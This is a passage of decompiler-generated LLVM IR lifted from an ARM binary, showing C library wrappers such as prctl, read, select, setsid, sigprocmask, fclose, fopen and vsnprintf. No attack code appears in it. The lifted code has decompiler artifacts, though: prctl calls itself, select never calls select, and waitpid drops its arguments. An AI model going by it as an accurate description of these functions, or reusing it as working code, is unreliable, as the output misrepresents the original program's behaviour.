  br i1 %tmp, label %dec_label_pc_f9d8, label %dec_label_pc_f9c8

dec_label_pc_f9c8:                                ; preds = %entry
  %v0_f9c8 = call i32 @__errno_location()
  %v0_f9cc = load i32, i32* %r4.global-to-local, align 4
  %v1_f9cc = sub i32 0, %v0_f9cc
  %v2_f9d0 = inttoptr i32 %v0_f9c8 to i32*
  store i32 %v1_f9cc, i32* %v2_f9d0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f9d8

dec_label_pc_f9d8:                                ; preds = %entry, %dec_label_pc_f9c8
  %v0_f9d8 = phi i32 [ %v2_f9b8, %entry ], [ -1, %dec_label_pc_f9c8 ]
  %v2_f9dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f9dc, i32* @r4, align 4
  ret i32 %v0_f9d8

; uselistorder directives
  uselistorder i32 %v2_f9b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f9d8, { 1, 0 }
}

define i32 @prctl() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f9e0 = load i32, i32* @r4, align 4
  store i32 %v3_f9e0, i32* %stack_var_-8, align 4
  %v0_f9e8 = call i32 @prctl()
  store i32 %v0_f9e8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f9e8, -4095
  br i1 %tmp, label %dec_label_pc_fa08, label %dec_label_pc_f9f8

dec_label_pc_f9f8:                                ; preds = %entry
  %v0_f9f8 = call i32 @__errno_location()
  %v0_f9fc = load i32, i32* %r4.global-to-local, align 4
  %v1_f9fc = sub i32 0, %v0_f9fc
  %v2_fa00 = inttoptr i32 %v0_f9f8 to i32*
  store i32 %v1_f9fc, i32* %v2_fa00, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fa08

dec_label_pc_fa08:                                ; preds = %entry, %dec_label_pc_f9f8
  %v0_fa08 = phi i32 [ %v0_f9e8, %entry ], [ -1, %dec_label_pc_f9f8 ]
  %v2_fa0c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fa0c, i32* @r4, align 4
  ret i32 %v0_fa08

; uselistorder directives
  uselistorder i32 %v0_f9e8, { 1, 0, 2 }
  uselistorder i32 ()* @prctl, { 1, 0 }
  uselistorder label %dec_label_pc_fa08, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa10 = load i32, i32* @r4, align 4
  store i32 %v3_fa10, i32* %stack_var_-8, align 4
  %v1_fa14 = load i32, i32* @r1, align 4
  %v2_fa14 = inttoptr i32 %v1_fa14 to i32*
  %v3_fa14 = load i32, i32* @r2, align 4
  %v4_fa14 = call i32 @read(i32 %arg1, i32* %v2_fa14, i32 %v3_fa14)
  store i32 %v4_fa14, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_fa14, -4095
  br i1 %tmp, label %dec_label_pc_fa34, label %dec_label_pc_fa24

dec_label_pc_fa24:                                ; preds = %entry
  %v0_fa24 = call i32 @__errno_location()
  %v0_fa28 = load i32, i32* %r4.global-to-local, align 4
  %v1_fa28 = sub i32 0, %v0_fa28
  %v2_fa2c = inttoptr i32 %v0_fa24 to i32*
  store i32 %v1_fa28, i32* %v2_fa2c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fa34

dec_label_pc_fa34:                                ; preds = %entry, %dec_label_pc_fa24
  %v0_fa34 = phi i32 [ %v4_fa14, %entry ], [ -1, %dec_label_pc_fa24 ]
  %v2_fa38 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fa38, i32* @r4, align 4
  ret i32 %v0_fa34

; uselistorder directives
  uselistorder i32 %v4_fa14, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fa34, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa3c = load i32, i32* @r4, align 4
  store i32 %v3_fa3c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_fa64, label %dec_label_pc_fa54

dec_label_pc_fa54:                                ; preds = %entry
  %v0_fa54 = call i32 @__errno_location()
  %v0_fa58 = load i32, i32* %r4.global-to-local, align 4
  %v1_fa58 = sub i32 0, %v0_fa58
  %v2_fa5c = inttoptr i32 %v0_fa54 to i32*
  store i32 %v1_fa58, i32* %v2_fa5c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_fa68.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fa64

dec_label_pc_fa64:                                ; preds = %entry, %dec_label_pc_fa54
  %v2_fa68 = phi i32 [ %v3_fa3c, %entry ], [ %v2_fa68.pre, %dec_label_pc_fa54 ]
  %v0_fa64 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_fa54 ]
  store i32 %v2_fa68, i32* @r4, align 4
  ret i32 %v0_fa64

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fa64, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa6c = load i32, i32* @r4, align 4
  store i32 %v3_fa6c, i32* %stack_var_-8, align 4
  %v0_fa70 = call i32 @setsid()
  store i32 %v0_fa70, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_fa70, -4095
  br i1 %tmp, label %dec_label_pc_fa90, label %dec_label_pc_fa80

dec_label_pc_fa80:                                ; preds = %entry
  %v0_fa80 = call i32 @__errno_location()
  %v0_fa84 = load i32, i32* %r4.global-to-local, align 4
  %v1_fa84 = sub i32 0, %v0_fa84
  %v2_fa88 = inttoptr i32 %v0_fa80 to i32*
  store i32 %v1_fa84, i32* %v2_fa88, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fa90

dec_label_pc_fa90:                                ; preds = %entry, %dec_label_pc_fa80
  %v0_fa90 = phi i32 [ %v0_fa70, %entry ], [ -1, %dec_label_pc_fa80 ]
  %v2_fa94 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fa94, i32* @r4, align 4
  ret i32 %v0_fa90

; uselistorder directives
  uselistorder i32 %v0_fa70, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fa90, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa98 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_fa98, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_faa05 = load i32, i32* @r4, align 4
  store i32 %v3_faa05, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fac0

bb:                                               ; preds = %entry
  %v3_faa0 = load i32, i32* @r4, align 4
  store i32 %v3_faa0, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_fac0, label %dec_label_pc_faac

dec_label_pc_faac:                                ; preds = %bb
  %v0_faac = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_fab8 = inttoptr i32 %v0_faac to i32*
  store i32 22, i32* %v2_fab8, align 4
  %v0_fae4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fae4

dec_label_pc_fac0:                                ; preds = %.thread, %bb
  %v7_fac0 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_fac0, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_fac0, -4095
  br i1 %tmp13, label %dec_label_pc_fae0, label %dec_label_pc_fad0

dec_label_pc_fad0:                                ; preds = %dec_label_pc_fac0
  %v0_fad0 = call i32 @__errno_location()
  %v0_fad4 = load i32, i32* %r4.global-to-local, align 4
  %v1_fad4 = sub i32 0, %v0_fad4
  %v2_fad8 = inttoptr i32 %v0_fad0 to i32*
  store i32 %v1_fad4, i32* %v2_fad8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fae0

dec_label_pc_fae0:                                ; preds = %dec_label_pc_fac0, %dec_label_pc_fad0
  %v0_fae0 = phi i32 [ %v7_fac0, %dec_label_pc_fac0 ], [ -1, %dec_label_pc_fad0 ]
  store i32 %v0_fae0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fae4

dec_label_pc_fae4:                                ; preds = %dec_label_pc_faac, %dec_label_pc_fae0
  %v0_fae4 = phi i32 [ %v0_fae4.pre, %dec_label_pc_faac ], [ %v0_fae0, %dec_label_pc_fae0 ]
  %v2_fae8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fae8, i32* @r4, align 4
  ret i32 %v0_fae4

; uselistorder directives
  uselistorder i32 %v7_fac0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_fae4, { 1, 0 }
  uselistorder label %dec_label_pc_fae0, { 1, 0 }
  uselistorder label %dec_label_pc_fac0, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_faec = load i32, i32* @r4, align 4
  store i32 %v3_faec, i32* %stack_var_-8, align 4
  %v2_faf0 = call i32 @time(i32* %arg1)
  store i32 %v2_faf0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_faf0, -4095
  br i1 %tmp, label %dec_label_pc_fb10, label %dec_label_pc_fb00

dec_label_pc_fb00:                                ; preds = %entry
  %v0_fb00 = call i32 @__errno_location()
  %v0_fb04 = load i32, i32* %r4.global-to-local, align 4
  %v1_fb04 = sub i32 0, %v0_fb04
  %v2_fb08 = inttoptr i32 %v0_fb00 to i32*
  store i32 %v1_fb04, i32* %v2_fb08, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fb10

dec_label_pc_fb10:                                ; preds = %entry, %dec_label_pc_fb00
  %v0_fb10 = phi i32 [ %v2_faf0, %entry ], [ -1, %dec_label_pc_fb00 ]
  %v2_fb14 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fb14, i32* @r4, align 4
  ret i32 %v0_fb10

; uselistorder directives
  uselistorder i32 %v2_faf0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fb10, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_fb1c = call i32 @wait4()
  ret i32 %v0_fb1c
}

define i32 @__libc_write(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fb20 = load i32, i32* @r4, align 4
  store i32 %v3_fb20, i32* %stack_var_-8, align 4
  %v3_fb24 = load i32, i32* @r2, align 4
  %v4_fb24 = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_fb24)
  store i32 %v4_fb24, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_fb24, -4095
  br i1 %tmp, label %dec_label_pc_fb44, label %dec_label_pc_fb34

dec_label_pc_fb34:                                ; preds = %entry
  %v0_fb34 = call i32 @__errno_location()
  %v0_fb38 = load i32, i32* %r4.global-to-local, align 4
  %v1_fb38 = sub i32 0, %v0_fb38
  %v2_fb3c = inttoptr i32 %v0_fb34 to i32*
  store i32 %v1_fb38, i32* %v2_fb3c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fb44

dec_label_pc_fb44:                                ; preds = %entry, %dec_label_pc_fb34
  %v0_fb44 = phi i32 [ %v4_fb24, %entry ], [ -1, %dec_label_pc_fb34 ]
  %v2_fb48 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fb48, i32* @r4, align 4
  ret i32 %v0_fb44

; uselistorder directives
  uselistorder i32 %v4_fb24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fb44, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v2_fb50 = load i32, i32* @global_var_23df4, align 4
  %v3_fb54 = mul i32 %arg1, 2
  %v4_fb54 = add i32 %v2_fb50, %v3_fb54
  %v5_fb54 = inttoptr i32 %v4_fb54 to i8*
  %v6_fb54 = load i8, i8* %v5_fb54, align 1
  %v8_fb54 = zext i8 %v6_fb54 to i32
  %v1_fb58 = and i32 %v8_fb54, 32
  ret i32 %v1_fb58
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_fb6c = icmp slt i32 %arg1, 0
  br i1 %v1_fb6c, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_fb6c = mul i32 %arg1, 2
  %v2_fb78 = load i32, i32* @global_var_23dfc, align 4
  %v2_fb7c = add i32 %v2_fb78, %v2_fb6c
  %v3_fb80 = inttoptr i32 %v2_fb7c to i8*
  %v4_fb80 = load i8, i8* %v3_fb80, align 1
  %v6_fb80 = zext i8 %v4_fb80 to i32
  %v1_fb84 = add i32 %v2_fb7c, 1
  %v2_fb84 = inttoptr i32 %v1_fb84 to i8*
  %v3_fb84 = load i8, i8* %v2_fb84, align 1
  %v4_fb84 = zext i8 %v3_fb84 to i32
  %v3_fb88 = mul nuw i32 %v4_fb84, 16777216
  %v4_fb8c = sdiv i32 %v3_fb88, 65536
  %v5_fb8c = or i32 %v4_fb8c, %v6_fb80
  ret i32 %v5_fb8c

; uselistorder directives
  uselistorder i32 %v2_fb7c, { 1, 0 }
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_2a3c8.588 to i32)
}

define i32 @__GI_fclose(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_fba4 = load i32, i32* @r4, align 4
  store i32 %v3_fba4, i32* %stack_var_-32, align 4
  %v6_fba4 = load i32, i32* @r5, align 4
  %v9_fba4 = load i32, i32* @r6, align 4
  %v12_fba4 = load i32, i32* @r7, align 4
  %v15_fba4 = load i32, i32* @r8, align 4
  %v2_fba8 = add i32 %tmp, 52
  %v3_fba8 = inttoptr i32 %v2_fba8 to i32*
  %v4_fba8 = load i32, i32* %v3_fba8, align 4
  store i32 %v4_fba8, i32* @r8, align 4
  %v2_fbac = add i32 %tmp, 56
  store i32 %v2_fbac, i32* @r5, align 4
  %v2_fbb0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_fbb4 = icmp eq i32 %v4_fba8, 0
  store i1 %v2_fbb4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_fbc4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_fbc4, i32* @r0, align 4
  br i1 %v2_fbb4, label %dec_label_pc_fbcc, label %dec_label_pc_fbe8

dec_label_pc_fbcc:                                ; preds = %entry
  store i32 79740, i32* %r3.global-to-local, align 4
  %v1_fbd4 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_13774.590 to i32), i32* %r3.global-to-local, align 4
  %v1_fbe4 = call i32 @__pthread_return_0()
  %v0_fbe8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fbe8

dec_label_pc_fbe8:                                ; preds = %entry, %dec_label_pc_fbcc
  %v0_fbf0 = phi i32 [ %tmp, %entry ], [ %v0_fbe8.pre, %dec_label_pc_fbcc ]
  %v1_fbe8 = inttoptr i32 %v0_fbf0 to i8*
  %v2_fbe8 = load i8, i8* %v1_fbe8, align 1
  %v3_fbe8 = zext i8 %v2_fbe8 to i32
  %v1_fbec = and i32 %v3_fbe8, 64
  store i32 %v1_fbec, i32* %r3.global-to-local, align 4
  %v2_fbec = icmp eq i32 %v1_fbec, 0
  store i1 %v2_fbec, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_fbec, i32* @r7, align 4
  br i1 %v2_fbec, label %dec_label_pc_fc04, label %dec_label_pc_fbfc

dec_label_pc_fbfc:                                ; preds = %dec_label_pc_fbe8
  %v3_fbfc = call i32 @fflush_unlocked(i8* %v1_fbe8)
  store i32 %v3_fbfc, i32* @r7, align 4
  %v0_fc04.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fc04

dec_label_pc_fc04:                                ; preds = %dec_label_pc_fbe8, %dec_label_pc_fbfc
  %v0_fc04 = phi i32 [ %v0_fbf0, %dec_label_pc_fbe8 ], [ %v0_fc04.pre, %dec_label_pc_fbfc ]
  %v1_fc04 = add i32 %v0_fc04, 4
  %v2_fc04 = inttoptr i32 %v1_fc04 to i32*
  %v3_fc04 = load i32, i32* %v2_fc04, align 4
  %v1_fc08 = call i32 @__libc_close(i32 %v3_fc04)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_fc10 = icmp slt i32 %v1_fc08, 0
  %v2_fc10 = icmp eq i32 %v1_fc08, 0
  store i1 %v2_fc10, i1* %cpsr_z.global-to-local, align 1
  %v1_fc14 = load i32, i32* @r4, align 4
  %v2_fc14 = add i32 %v1_fc14, 4
  %v3_fc14 = inttoptr i32 %v2_fc14 to i32*
  store i32 -1, i32* %v3_fc14, align 4
  store i32 %v2_fbb0, i32* @r0, align 4
  br i1 %v1_fc10, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_fc04
  %v3_fc28 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_fc28, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_fc04, %bb
  %v1_fc34 = call i32 @__pthread_return_void()
  %v1_fc40 = call i32 @__pthread_return_0()
  %v2_fc48 = load i32, i32* @global_var_28194.596, align 4
  %v1_fc4c = add i32 %v2_fc48, 1
  store i32 %v1_fc4c, i32* %r3.global-to-local, align 4
  store i32 %v1_fc4c, i32* @global_var_28194.596, align 4
  store i32 %v2_fbb0, i32* @r0, align 4
  %v1_fc64 = call i32 @__pthread_return_void()
  %v0_fc68 = load i32, i32* @r4, align 4
  %v1_fc68 = inttoptr i32 %v0_fc68 to i32*
  %v2_fc68 = load i32, i32* %v1_fc68, align 4
  %v1_fc6c = and i32 %v2_fc68, 24576
  store i32 %v1_fc6c, i32* %r3.global-to-local, align 4
  %v3_fc701 = udiv i32 %v1_fc6c, 256
  %v1_fc74 = trunc i32 %v3_fc701 to i8
  %v3_fc74 = add i32 %v0_fc68, 1
  %v4_fc74 = inttoptr i32 %v3_fc74 to i8*
  store i8 %v1_fc74, i8* %v4_fc74, align 1
  %v0_fc78 = load i32, i32* %r3.global-to-local, align 4
  %v1_fc78 = trunc i32 %v0_fc78 to i8
  %v2_fc78 = load i32, i32* @r4, align 4
  %v3_fc78 = inttoptr i32 %v2_fc78 to i8*
  store i8 %v1_fc78, i8* %v3_fc78, align 1
  %v0_fc7c = load i32, i32* @r4, align 4
  %v1_fc7c = inttoptr i32 %v0_fc7c to i32*
  %v2_fc7c = load i32, i32* %v1_fc7c, align 4
  %v1_fc80 = or i32 %v2_fc7c, 48
  store i32 %v1_fc80, i32* %r3.global-to-local, align 4
  %v3_fc84 = sdiv i32 %v2_fc7c, 256
  %v0_fc88 = load i32, i32* @r8, align 4
  %v2_fc88 = icmp eq i32 %v0_fc88, 0
  store i1 %v2_fc88, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_fbc4, i32* @r0, align 4
  %v1_fc98 = trunc i32 %v3_fc84 to i8
  %v3_fc98 = add i32 %v0_fc7c, 1
  %v4_fc98 = inttoptr i32 %v3_fc98 to i8*
  store i8 %v1_fc98, i8* %v4_fc98, align 1
  %v0_fc9c = load i32, i32* %r3.global-to-local, align 4
  %v1_fc9c = trunc i32 %v0_fc9c to i8
  %v2_fc9c = load i32, i32* @r4, align 4
  %v3_fc9c = inttoptr i32 %v2_fc9c to i8*
  store i8 %v1_fc9c, i8* %v3_fc9c, align 1
  %v0_fca0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fca0, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_fca4 = call i32 @__pthread_return_void()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_fca8 = load i32, i32* @r4, align 4
  %v1_fca8 = add i32 %v0_fca8, 1
  %v2_fca8 = inttoptr i32 %v1_fca8 to i8*
  %v3_fca8 = load i8, i8* %v2_fca8, align 1
  %v4_fca8 = zext i8 %v3_fca8 to i32
  store i32 %v4_fca8, i32* %r3.global-to-local, align 4
  %v1_fcac = and i32 %v4_fca8, 64
  %v2_fcac = icmp eq i32 %v1_fcac, 0
  store i1 %v2_fcac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fcac, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_fcb4 = xor i1 %v2_fcac, true
  call void @__pseudo_cond_branch(i1 %v1_fcb4, i32 ptrtoint (i32* @global_var_127a8.598 to i32))
  store i32 %v2_fbb0, i32* @r0, align 4
  %v1_fcc8 = call i32 @__pthread_return_void()
  %v1_fcd4 = call i32 @__pthread_return_0()
  %v2_fcdc = load i32, i32* @global_var_28198.601, align 4
  %v1_fce0 = add i32 %v2_fcdc, 1
  store i32 %v1_fce0, i32* %r3.global-to-local, align 4
  store i32 %v2_fbb0, i32* @r0, align 4
  store i32 %v1_fce0, i32* @global_var_28198.601, align 4
  %v1_fcf4 = call i32 @__pthread_return_void()
  %v1_fcf8 = call i32 @_stdio_openlist_dec_use(i32 %v1_fcf4)
  %v0_fcfc = load i32, i32* @r7, align 4
  %v2_fd04 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_fd04, i32* @r4, align 4
  store i32 %v6_fba4, i32* @r5, align 4
  store i32 %v9_fba4, i32* @r6, align 4
  store i32 %v12_fba4, i32* @r7, align 4
  store i32 %v15_fba4, i32* @r8, align 4
  ret i32 %v0_fcfc

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_fc04, { 1, 0 }
  uselistorder label %dec_label_pc_fbe8, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_fd2c = call i32 @_stdio_fopen()
  ret i32 %v0_fd2c
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_fd3c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_fd3c, i32* @ip, align 4
  store i32 %v2_fd3c, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_fd50 = call i32 @__GI_vsnprintf()
  ret i32 %v0_fd50

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_fd64 = load i32, i32* @r4, align 4
  %v6_fd64 = load i32, i32* @r5, align 4
  %v12_fd64 = load i32, i32* @r7, align 4
  %v15_fd64 = load i32, i32* @r8, align 4
  %v18_fd64 = load i32, i32* @sl, align 4
  %v0_fd68 = load i32, i32* @r3, align 4
  store i32 %v0_fd68, i32* @r8, align 4
  %v2_fd6c = ptrtoint i32* %stack_var_-108 to i32
  %v0_fd74 = load i32, i32* @r0, align 4
  %v1_fd74 = sub i32 -1, %v0_fd74
  store i32 %v1_fd74, i32* @r5, align 4
  store i32 %v0_fd74, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_fd88 = load i32, i32* @r1, align 4
  %v3_fd88 = icmp ult i32 %v1_fd74, %v1_fd88
  br i1 %v3_fd88, label %bb23, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_fd88, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %entry, %bb
  %v0_fd90 = load i32, i32* @r2, align 4
  store i32 %v0_fd90, i32* @r7, align 4
  %v2_fd94 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_fd94, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  %v0_fdb0 = call i32 @__stdio_init_mutex()
  %v0_fdb4 = load i32, i32* @r4, align 4
  %v1_fdb4 = load i32, i32* @r5, align 4
  %v2_fdb4 = add i32 %v1_fdb4, %v0_fdb4
  %v0_fdbc = load i32, i32* @r7, align 4
  %v0_fdc0 = load i32, i32* @r8, align 4
  %v0_fdcc = load i32, i32* @sl, align 4
  %v12_fde0 = inttoptr i32 %v0_fdbc to i8*
  %v13_fde0 = call i32 @_vfprintf_internal(i32 %v2_fd6c, i8* %v12_fde0, i32 %v0_fdc0, i32 %v2_fdb4, i32 %v0_fdb4, i32 %v2_fdb4, i32 %v0_fdb4, i32 %v0_fdb4, i32 %v0_fdb4, i32 %v2_fdb4, i32 %v0_fdcc)
  %v0_fde4 = load i32, i32* @r5, align 4
  %v1_fde4 = load i32, i32* @sl, align 4
  %v9_fde4 = icmp eq i32 %v0_fde4, %v1_fde4
  br i1 %v9_fde4, label %dec_label_pc_fe0c, label %dec_label_pc_fdf0

dec_label_pc_fdf0:                                ; preds = %bb23
  %v9_fdf8 = icmp eq i32 %v1_fdb4, 0
  %v1_fdfc = sext i1 %v9_fdf8 to i32
  %v1_fdfc.v0_fdc4 = add i32 %v0_fdb4, %v1_fdfc
  %stack_var_-92.0 = inttoptr i32 %v1_fdfc.v0_fdc4 to i8*
  %v1_fe08 = trunc i32 %v1_fde4 to i8
  store i8 %v1_fe08, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_fe0c

dec_label_pc_fe0c:                                ; preds = %bb23, %dec_label_pc_fdf0
  store i32 %v3_fd64, i32* @r4, align 4
  store i32 %v6_fd64, i32* @r5, align 4
  store i32 %v12_fd64, i32* @r7, align 4
  store i32 %v15_fd64, i32* @r8, align 4
  store i32 %v18_fd64, i32* @sl, align 4
  ret i32 %v13_fde0

; uselistorder directives
  uselistorder i32 %v1_fdb4, { 1, 0 }
  uselistorder i32 %v0_fdb4, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 %v1_fd88, { 1, 0 }
  uselistorder i32 %v0_fd74, { 1, 0 }
  uselistorder label %dec_label_pc_fe0c, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_fe14 = load i32, i32* @r4, align 4
  store i32 %v3_fe14, i32* %stack_var_-24, align 4
  %v6_fe14 = load i32, i32* @r5, align 4
  %v9_fe14 = load i32, i32* @r6, align 4
  %v15_fe14 = load i32, i32* @r8, align 4
  %v0_fe18 = load i32, i32* @r1, align 4
  %v1_fe18 = inttoptr i32 %v0_fe18 to i8*
  %v2_fe18 = load i8, i8* %v1_fe18, align 1
  %v3_fe18 = zext i8 %v2_fe18 to i32
  store i32 %v3_fe18, i32* @ip, align 4
  %v7_fe1c = icmp eq i8 %v2_fe18, 114
  store i1 %v7_fe1c, i1* %cpsr_z.global-to-local, align 1
  %v2_fe20 = ptrtoint i32* %stack_var_-56 to i32
  %v0_fe24 = load i32, i32* @r0, align 4
  store i32 %v0_fe24, i32* @r6, align 4
  %v0_fe28 = load i32, i32* @r2, align 4
  store i32 %v0_fe28, i32* @r8, align 4
  %v0_fe2c = load i32, i32* @r3, align 4
  store i32 %v0_fe2c, i32* @r5, align 4
  br i1 %v7_fe1c, label %dec_label_pc_fe78, label %dec_label_pc_fe34

dec_label_pc_fe34:                                ; preds = %entry
  %v7_fe34 = icmp eq i8 %v2_fe18, 119
  store i1 %v7_fe34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe34, label %bb, label %dec_label_pc_fe40

bb:                                               ; preds = %dec_label_pc_fe34
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_fe7c

dec_label_pc_fe40:                                ; preds = %dec_label_pc_fe34
  %v7_fe40 = icmp eq i8 %v2_fe18, 97
  store i1 %v7_fe40, i1* %cpsr_z.global-to-local, align 1
